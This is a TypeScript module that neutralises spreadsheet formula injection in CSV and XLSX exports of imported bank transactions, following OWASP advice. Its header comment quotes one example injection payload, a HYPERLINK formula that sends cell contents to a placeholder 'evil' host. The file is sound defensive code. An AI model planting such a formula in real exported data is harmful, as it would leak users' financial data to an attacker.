/**
 * Spreadsheet formula-injection (CSV/XLSX injection) defence for exports.
 *
 * Excel, Google Sheets and LibreOffice treat a cell starting with `=`, `+`,
 * `-`, `@`, tab or carriage return as a formula. Transaction descriptions,
 * merchants, notes and names come from imported bank files, so a hostile row
 * like `=HYPERLINK("http://evil/?"&A1,"x")` would execute when the export is
 * opened. Per OWASP, text that could start a formula gets a leading `'`.
 *
 * Only strings are touched: numbers (including negative amounts) are written
 * as numbers/`String(n)` by callers and never pass through here.
 */

const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Prefix a text value with `'` when a spreadsheet would read it as a formula. */
export function neutralizeFormula(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

/** One CSV text cell: formula-neutralised, then RFC 4180 quoted when needed. */
export function csvText(value: string): string {
  const v = neutralizeFormula(value);
  return /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
}

/** Neutralise every string field of a row bound for XLSX/`json_to_sheet`; non-strings pass through. */
export function sanitizeRow<T extends Record<string, unknown>>(row: T): T {
  const out: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(row)) out[k] = typeof v === 'string' ? neutralizeFormula(v) : v;
  return out as T;
}
